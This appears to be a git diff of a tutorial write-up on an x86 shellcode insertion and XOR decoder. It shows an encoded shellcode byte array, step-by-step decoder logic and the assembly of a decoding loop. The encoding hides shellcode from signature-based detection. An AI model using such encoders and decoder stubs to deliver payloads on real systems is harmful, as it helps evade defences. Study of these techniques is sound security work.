@@ -97,14 +97,40 @@ master:
       shellcode: db 0x88,0x45,0x79,0x45,0xe9,0x45,0xd1,0x45,0x96,0x45,0x96,0x45,0xca,0x45,0xd1,0x45,0xd1,0x45,0x96,0x45,0xdb,0x45,0xd0,0x45,0xd7,0x45,0x30,0x45,0x5a,0x45,0xe9,0x45,0x30,0x45,0x5b,0x45,0x09,0x45,0xb2,0x45,0x74,0x45,0x39,0x45
 ```
 
-Right now, the flow jumps to the master section and calls main, pushing the value of shellcode into the stack and popping into EBP. Furhtermore, this value is copied into ESI, 
+Right now, the flow jumps to the master section and calls main, pushing the value of shellcode into the stack and popping into EBP. Furthermore, this value is copied into ESI, 
 this will be essential when it comes to the following sections of XORing and NOT decoding the instructions, as the ESI value will have to be zeroed, therefore, EBP being a 
 backup register.
 
+Now, the following steps are the same as when it comes to any insertion decoder:
 
++ Point EDI to the additional bytes.
++ Start a counter for the loop. (44 bytes in our case)
++ Point BL to the additional bytes.
++ XOR BL by the additional bytes.
++ Point BL to the following byte, which should be the intended.
++ Copy the value of BL into EDI, slowly restoring the original order.
++ Increment EDI in order to repeat the process.
++ AL is incremented by 2, once again to repeat the process.
++ Start the loop
 
+```term
+      lea edi, [esi + 1]             ; Points to the 0x45 byte
 
+      xor eax, eax                   ; Zeroes out EAX
+      xor ebx, ebx                   ; Zeroes out EBX
 
+      mov cl, 44                     ; Stores counter (44 bytes)
+      mov al, 1                      ; Makes AL hold value 1 for later calculations.
+      
+decode:
+
+      mov bl, byte [esi + eax]       ; Points to 0x45
+      xor bl, 0x45                   ; Turns 0x45 into 0x00
+      mov bl, byte [esi + eax + 1]   ; Grabs intended value
+      mov byte [edi], bl             ; Replaces 0x00 for the intended value
+      inc edi                        ; Increments EDI, holding next 0xAA for replacement
+      add al, 2                      ; Adds 2 in order to continue the process
+      loop decode                    ; Starts loop
 
 #### EndGame
 
